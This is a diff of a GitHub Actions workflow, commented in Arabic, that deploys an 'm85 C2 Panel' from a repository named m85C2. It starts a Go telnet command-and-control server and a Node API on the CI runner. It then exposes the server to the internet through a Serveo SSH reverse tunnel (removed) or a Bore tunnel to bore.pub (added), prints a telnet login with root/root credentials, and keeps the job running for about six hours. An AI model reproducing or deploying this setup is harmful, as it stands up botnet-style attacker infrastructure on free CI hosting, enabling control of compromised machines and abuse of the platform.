@@ -1,99 +1,82 @@
-name: m85 C2 Panel Ultimate
+name: m85 C2 Panel (Fixed)
 on:
   workflow_dispatch:
 
 jobs:
   deploy-and-run:
     runs-on: ubuntu-latest
-    timeout-minutes: 355  # العمل لمدة 6 ساعات كحد أقصى
+    timeout-minutes: 360
     
     steps:
-      # 1. سحب ملفات المشروع الأصلي
+      # 1. سحب ملفات المشروع
       - name: Checkout Project
         uses: actions/checkout@v4
         with:
           repository: 'iamthebestm85/m85C2'
 
-      # 2. تجهيز لغة Go (لتشغيل السيرفر الرئيسي)
-      - name: Setup Go
-        uses: actions/setup-go@v5
-        with:
-          go-version: '1.21'
-
-      # 3. تجهيز لغة Node.js (لتشغيل الـ API)
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
-        with:
-          node-version: '20'
-
-      # 4. تجهيز لغة Python (لأدوات الصور)
-      - name: Setup Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: '3.10'
-
-      # 5. تثبيت جميع المكتبات المطلوبة دفعة واحدة
-      - name: Install All Dependencies
+      # 2. تجهيز البيئات (Go, Node, Python)
+      - name: Setup Environment
         run: |
-          echo ">>> Installing Python Requirements..."
-          pip install numpy Pillow
+          sudo apt-get update
+          sudo apt-get install -y golang-go nodejs npm python3 python3-pip wget
           
-          echo ">>> Installing Node.js Requirements..."
+          # تثبيت مكتبات بايثون
+          pip3 install numpy Pillow
+          
+          # تثبيت مكتبات Node
           npm install express child_process
           
-          echo ">>> Initializing Go Module..."
-          # التأكد من وجود ملف go.mod
+          # تجهيز Go
           if [ ! -f go.mod ]; then go mod init m85-c2; fi
           go mod tidy
 
-      # 6. تشغيل الخدمات (API و C2) في الخلفية
-      - name: Start C2 Services
+      # 3. تحميل أداة Bore (البديل القوي لـ Serveo)
+      - name: Install Bore Tunnel
         run: |
-          echo ">>> Starting API Server on Port 9998..."
+          echo ">>> Downloading Bore..."
+          wget https://github.com/ekzhang/bore/releases/download/v0.5.1/bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz
+          tar -xf bore-v0.5.1-x86_64-unknown-linux-musl.tar.gz
+          chmod +x bore
+          sudo mv bore /usr/local/bin/
+
+      # 4. تشغيل الخدمات
+      - name: Start Services
+        run: |
+          echo ">>> Starting API..."
           nohup node api.js > api_log.txt 2>&1 &
           
-          echo ">>> Starting C2 Telnet Server on Port 1111..."
+          echo ">>> Starting C2 Server..."
           nohup go run c2.go > c2_log.txt 2>&1 &
-          
-          # الانتظار 5 ثواني للتأكد من أن السيرفرات اشتغلت
           sleep 5
-          
-          # التحقق السريع من أن العمليات تعمل
-          if pgrep -f "go run c2.go" > /dev/null; then
-            echo ">>> C2 Server is RUNNING successfully."
-          else
-            echo ">>> WARNING: C2 Server might have failed. Check logs."
-            cat c2_log.txt
-          fi
 
-      # 7. فتح النفق (Tunnel) وعرض معلومات الاتصال
-      - name: Create Tunnel & Show Login Info
+      # 5. فتح النفق وعرض الرابط
+      - name: Create Tunnel & Show Info
         run: |
-          echo ">>> Requesting a raw TCP tunnel from Serveo..."
+          echo ">>> Creating TCP Tunnel via Bore..."
+          # تشغيل النفق وتوجيه المنفذ 1111
+          nohup bore local 1111 --to bore.pub > tunnel_log.txt 2>&1 &
           
-          # نطلب منفذ عشوائي (0) للاتصال بـ localhost:1111
-          ssh -o StrictHostKeyChecking=no -R 0:localhost:1111 serveo.net > connection_info.txt 2>&1 &
-          
-          # انتظار 10 ثواني حتى يعطينا Serveo الرابط والمنفذ
-          sleep 10
+          sleep 5
           
           echo "=========================================================="
           echo "       ✅  S E R V E R   R E A D Y  ✅"
           echo "=========================================================="
           echo "👇 انسخ الأمر التالي وضعه في Termux للاتصال 👇"
           echo ""
-          # استخراج وعرض أمر الاتصال الجاهز
-          grep -o "Forwarding TCP from serveo.net:[0-9]*" connection_info.txt | awk -F: '{print "telnet serveo.net " $2}'
+          # استخراج الرابط والمنفذ تلقائياً
+          PORT=$(grep -o "listening at bore.pub:[0-9]*" tunnel_log.txt | awk -F: '{print $2}')
+          if [ -z "$PORT" ]; then
+            echo "❌ فشل الحصول على الرابط، الرجاء المحاولة مرة أخرى."
+            cat tunnel_log.txt
+          else
+            echo "telnet bore.pub $PORT"
+          fi
           echo ""
           echo "=========================================================="
           echo "🔑 Username: root"
           echo "🔑 Password: root"
           echo "=========================================================="
           
-          # عرض السجل في حال فشل الاستخراج
-          echo "DEBUG INFO (If link is missing above):"
-          cat connection_info.txt
-
           # إبقاء الجلسة تعمل
           sleep 21500
 
